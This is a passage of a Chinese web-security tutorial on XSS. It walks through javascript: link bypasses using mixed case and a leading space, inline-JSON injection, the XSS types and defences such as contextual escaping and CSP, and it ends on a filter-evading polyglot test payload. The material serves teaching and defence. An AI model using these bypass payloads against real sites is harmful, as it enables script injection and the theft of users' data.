  <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;/404&quot;</span><span class="token operator">&gt;</span>
    跳转<span class="token operator">...</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>只要 URL 的开头不是 javascript:，就安全了吧？</p> <p>安全组随手又扔了一个连接：<code>http://xxx/?redirect_to=jAvascRipt:alert('XSS')</code></p> <p>这也能执行？…..好吧，浏览器就是这么强大。<br>
小明欲哭无泪，在判断 URL 开头是否为 javascript: 时，先把用户输入转成了小写，然后再进行比对。</p> <p>不过，所谓“道高一尺，魔高一丈”。面对小明的防护策略，安全组就构造了这样一个连接：</p> <p><code>http://xxx/?redirect_to=%20javascript:alert('XSS')</code></p> <p><code>%20javascript:alert('XSS')</code>经过 URL 解析后变成 <code>javascript:alert('XSS')</code>，这个字符串以空格开头。这样攻击者可以绕过后端的关键词规则，又成功的完成了注入。</p> <p>最终，小明选择了白名单的方法，彻底解决了这个漏洞：</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// 根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等</span>
allowSchemes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;http&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;https&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

valid <span class="token operator">=</span> <span class="token function">isValid</span><span class="token punctuation">(</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">&quot;redirect_to&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> allowSchemes<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>valid<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span>redirect_to<span class="token string">&quot;))%&gt;&quot;</span><span class="token operator">&gt;</span>
    跳转<span class="token operator">...</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;/404&quot;</span><span class="token operator">&gt;</span>
    跳转<span class="token operator">...</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>通过这个事件，小明学习到了如下知识：</p> <p>做了 HTML 转义，并不等于高枕无忧。<br>
对于链接跳转，如 <code>&lt;a href=&quot;xxx&quot;</code> 或 <code>location.href=&quot;xxx&quot;</code>，要检验其内容，禁止以 <code>javascript:</code> 开头的链接，和其他非法的 <code>scheme</code>。</p> <p>根据上下文采用不同的转义规则</p> <p>某天，小明为了加快网页的加载速度，把一个数据通过 JSON 的方式内联到 HTML 中：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">var</span> initData <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token operator">%=</span> data<span class="token punctuation">.</span><span class="token function">toJSON</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>插入 JSON 的地方不能使用 <code>escapeHTML()</code>，因为转义 &quot; 后，JSON 格式会被破坏。</p> <p>但安全组又发现有漏洞，原来这样内联 JSON 也是不安全的：</p> <p>当 JSON 中包含 <code>U+2028</code> 或 <code>U+2029</code> 这两个字符时，不能作为 JavaScript 的字面量使用，否则会抛出语法错误。<br>
当 JSON 中包含字符串<code>&lt;script&gt;</code>时，当前的 script 标签将会被闭合，后面的字符串内容浏览器会按照 HTML 进行解析；通过增加下一个 <code>&lt;script&gt;</code> 标签等方法就可以完成注入。</p> <p>于是我们又要实现一个 <code>escapeEmbedJSON()</code> 函数，对内联 JSON 进行转义。转义规则如下：<br> <a href="https://mmbiz.qpic.cn/mmbiz_png/hEx03cFgUsXw7kYHEwyuqDeZaFMIic8iaRuB7Ilmo9llQoBmSnHjXswyxcX1afXZ4ZyFGYLCmnk7cEG7Y0w3k0LQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" target="_blank" rel="noopener noreferrer">escapeEmbedJSON<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>
修复后的代码如下：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">var</span> initData <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token function">escapeEmbedJSON</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toJSON</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>通过这个事件，小明学习到了如下知识：</p> <p>HTML 转义是非常复杂的，在不同的情况下要采用不同的转义规则。如果采用了错误的转义规则，很有可能会埋下 XSS 隐患。<br>
应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。</p> <h3 id="漏洞总结"><a href="#漏洞总结" class="header-anchor">#</a> 漏洞总结</h3> <p>小明的例子讲完了，下面我们来系统的看下 XSS 有哪些注入的方法：</p> <p>1.在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。<br>
2.在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。<br>
3.在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。<br>
4.在标签的 href、src 等属性中，包含 javascript: 等可执行代码。<br>
5.在 onload、onerror、onclick 等事件中，注入不受控制代码。<br>
6.在 style 属性和标签中，包含类似 background-image:url(&quot;javascript:...&quot;); 的代码（新版本浏览器已经可以防范）。<br>
7.在 style 属性和标签中，包含类似 expression(...) 的 CSS 表达式代码（新版本浏览器已经可以防范）。<br>
总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p> <h3 id="xss攻击的分类"><a href="#xss攻击的分类" class="header-anchor">#</a> XSS攻击的分类</h3> <h3 id="什么是-xss"><a href="#什么是-xss" class="header-anchor">#</a> 什么是 XSS</h3> <p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。
为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。</p> <p>XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p> <p>而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。</p> <p>在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。</p> <p>这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？</p> <p>不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：</p> <p>来自用户的 UGC 信息<br>
来自第三方的链接<br>
URL 参数<br>
POST 参数<br>
Referer （可能来自不可信的来源）<br>
Cookie （可能来自其他子域注入）</p> <h3 id="xss-分类"><a href="#xss-分类" class="header-anchor">#</a> XSS 分类</h3> <p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p> <p>存储区：恶意代码存放的位置。<br>
插入点：由谁取得恶意代码，并插入到网页上。</p> <h4 id="存储型-xss"><a href="#存储型-xss" class="header-anchor">#</a> 存储型 XSS</h4> <p>存储型 XSS 的攻击步骤：</p> <p>1.攻击者将恶意代码提交到目标网站的数据库中。<br>
2.用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。<br>
3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。<br>
4.在部分情况下，恶意代码加载外部的代码，用于执行更复杂的逻辑。<br>
5.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。<br>
6.这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p> <h4 id="反射型-xss"><a href="#反射型-xss" class="header-anchor">#</a> 反射型 XSS</h4> <p>反射型 XSS 的攻击步骤：</p> <p>1.攻击者构造出特殊的 URL，其中包含恶意代码。<br>
2.用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。<br>
3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。<br>
4.在部分情况下，恶意代码加载外部的代码，用于执行更复杂的逻辑<br>
5.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。<br>
6.反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p> <p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p> <p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p> <p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p> <h4 id="dom-型-xss"><a href="#dom-型-xss" class="header-anchor">#</a> DOM 型 XSS</h4> <p>DOM 型 XSS 的攻击步骤：</p> <p>1.攻击者构造出特殊的 URL，其中包含恶意代码。<br>
2.用户打开带有恶意代码的 URL。<br>
3.用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。<br>
4.在部分情况下，恶意代码加载外部的代码，用于执行更复杂的逻辑。<br>
5.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。<br>
6.DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p> <h3 id="xss攻击的预防"><a href="#xss攻击的预防" class="header-anchor">#</a> XSS攻击的预防</h3> <p>通过前面的介绍可以得知，XSS 攻击有两大要素：</p> <p>1.攻击者提交恶意代码。<br>
2.浏览器执行恶意代码。<br>
针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？</p> <p>a)输入过滤</p> <p>在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？<br>
答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。</p> <p>那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？</p> <p>我们举一个例子，一个正常的用户输入了 <code>5 &lt; 7</code>这个内容，在写入数据库前，被转义，变成了 <code>5 &amp;lt; 7</code>。</p> <p>问题是：在提交阶段，我们并不确定内容要输出到哪里。</p> <p>这里的“并不确定内容要输出到哪里”有两层含义：</p> <p>用户的输入内容可能同时提供给前端和客户端，而一旦经过了 <code>escapeHTML()</code>，客户端显示的内容就变成了乱码<code>( 5 &amp;lt; 7 )</code>。<br>
在前端中，不同的位置所需的编码也不同。<br>
当 <code>5 &amp;lt; 7</code>作为 HTML 拼接页面时，可以正常显示：<br> <code>&lt;div title=&quot;comment&quot;&gt;5 &amp;lt; 7&lt;/div&gt;</code><br>
当 <code>5 &amp;lt; 7</code> 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。<br>
所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。</p> <p>当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。</p> <p>既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类：</p> <p>a)防止 HTML 中出现注入。<br>
b)防止 JavaScript 执行时，执行恶意代码。</p> <h4 id="预防存储型和反射型-xss-攻击"><a href="#预防存储型和反射型-xss-攻击" class="header-anchor">#</a> 预防存储型和反射型 XSS 攻击</h4> <p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。<br>
预防这两种漏洞，有两种常见做法：</p> <p>a)改成纯前端渲染，把代码和数据分隔开。<br>
b)对 HTML 做充分转义。</p> <p>纯前端渲染</p> <p>纯前端渲染的过程：</p> <p>1.浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。<br>
2.然后浏览器执行 HTML 中的 JavaScript。<br>
3.JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。<br>
在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本<code>（.innerText）</code>，还是属性（<code>.setAttribute）</code>，还是样式<code>（.style）</code>等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p> <p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 <code>onload</code>事件和 href 中的 <code>javascript:xxx</code>等，请参考”预防 DOM 型 XSS 攻击“部分）。</p> <p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p> <p>转义 HTML</p> <p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。<br>
常用的模板引擎，如 <code>doT.js、ejs、FreeMarker</code> 等，对于 HTML 转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; &quot; ' /</code>这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：<br>
所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p> <p>例如 Java 工程里，常用的转义库为<code>org.owasp.encoder</code>。以下代码引用自 <code>org.owasp.encoder</code>的官方说明。</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token comment">&lt;!-- HTML 标签内文字内容 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>&lt;%= Encode.forHtml(UNTRUSTED) %&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- HTML 标签属性值 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>&lt;%= Encode.forHtml(UNTRUSTED) %&gt;<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>

<span class="token comment">&lt;!-- CSS 属性值 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">=&quot;</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span>&lt;= Encode.<span class="token function">forCssString</span><span class="token punctuation">(</span>UNTRUSTED<span class="token punctuation">)</span> %&gt;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- CSS URL --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">=&quot;</span><span class="token attr-value"><span class="token property">background</span><span class="token punctuation">:</span>&lt;= Encode.forCss<span class="token url"><span class="token function">Url</span><span class="token punctuation">(</span>UNTRUSTED<span class="token punctuation">)</span></span> %&gt;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- JavaScript 内联代码块 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">var</span> msg <span class="token operator">=</span> <span class="token string">&quot;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&quot;</span><span class="token punctuation">;</span>
  <span class="token function">alert</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- JavaScript 内联代码块内嵌 JSON --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">var</span> __INITIAL_STATE__ <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&lt;%= Encoder.forJavaScript(data.to_json) %&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- HTML 标签内联监听器 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span>
  <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>alert('&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;');<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  click me
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- URL 参数 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- URL 路径 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!--
  URL.
  注意：要根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等
--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>&lt;%=
  urlValidator.isValid(UNTRUSTED) ?
    Encode.forHtml(UNTRUSTED) :
    &quot;/404&quot;
%&gt;<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>link
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br></div></div><p>可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。</p> <h3 id="预防-dom-型-xss-攻击"><a href="#预防-dom-型-xss-攻击" class="header-anchor">#</a> 预防 DOM 型 XSS 攻击</h3> <p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。
在使用 <code>.innerHTML、.outerHTML、document.write()</code>时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用<code>.textContent、.setAttribute()</code> 等。</p> <p>如果用 Vue/React 技术栈，并且不使用 <code>v-html/dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免<code>innerHTML、outerHTML</code>的 XSS 隐患。</p> <p>DOM 中的内联事件监听器，如 <code>location、onclick、onerror、onload、onmouseover</code> 等，<code>&lt;a&gt; 标签的 href 属性</code>，J<code>avaScript 的 eval()、setTimeout()、setInterval()</code>等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token comment">&lt;!-- 内联事件监听器中包含恶意代码 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>UNTRUSTED<span class="token punctuation">&quot;</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>UNTRUSTED<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>data:image/png,<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- 链接内包含恶意代码 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>UNTRUSTED<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token comment">// setTimeout()/setInterval() 中调用恶意代码</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">&quot;UNTRUSTED&quot;</span><span class="token punctuation">)</span>
<span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token string">&quot;UNTRUSTED&quot;</span><span class="token punctuation">)</span>

<span class="token comment">// location 调用恶意代码</span>
location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'UNTRUSTED'</span>

<span class="token comment">// eval() 中调用恶意代码</span>
<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">&quot;UNTRUSTED&quot;</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。</p> <h3 id="其他xss防范措施"><a href="#其他xss防范措施" class="header-anchor">#</a> 其他XSS防范措施</h3> <p>虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。</p> <h4 id="content-security-policy"><a href="#content-security-policy" class="header-anchor">#</a> Content Security Policy</h4> <p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p> <p>1.禁止加载外域代码，防止复杂的攻击逻辑。<br>
2.禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。<br>
3.禁止内联脚本执行（规则较严格，目前发现 github 使用）。<br>
4.禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。<br>
5.合理使用上报可以及时发现 XSS，利于尽快修复问题。</p> <h4 id="输入内容长度控制"><a href="#输入内容长度控制" class="header-anchor">#</a> 输入内容长度控制</h4> <p>对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</p> <h4 id="其他安全措施"><a href="#其他安全措施" class="header-anchor">#</a> 其他安全措施</h4> <p>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。<br>
验证码：防止脚本冒充用户提交危险操作。</p> <h3 id="xss的检测"><a href="#xss的检测" class="header-anchor">#</a> XSS的检测</h3> <p>上述经历让小明收获颇丰，他也学会了如何去预防和修复 XSS 漏洞，在日常开发中也具备了相关的安全意识。但对于已经上线的代码，如何去检测其中有没有 XSS 漏洞呢？</p> <p>经过一番搜索，小明找到了两个方法：</p> <p>使用通用 XSS 攻击字符串手动检测 XSS 漏洞。<br>
使用扫描工具自动检测 XSS 漏洞。<br>
小明发现了这么一个字符串：</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>jaVasCript<span class="token punctuation">:</span><span class="token comment">/*-/*`/*\`/*'/*&quot;/**/</span><span class="token punctuation">(</span><span class="token comment">/* */</span>oNcliCk<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e`</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 <code>eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write()</code>等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。</p> <p>小明只要在网站的各输入框中提交这个字符串，或者把它拼接到 URL 参数上，就可以进行检测了。</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xxx<span class="token operator">/</span>search<span class="token operator">?</span>keyword<span class="token operator">=</span>jaVasCript<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">*</span><span class="token operator">-</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">*</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">*</span><span class="token 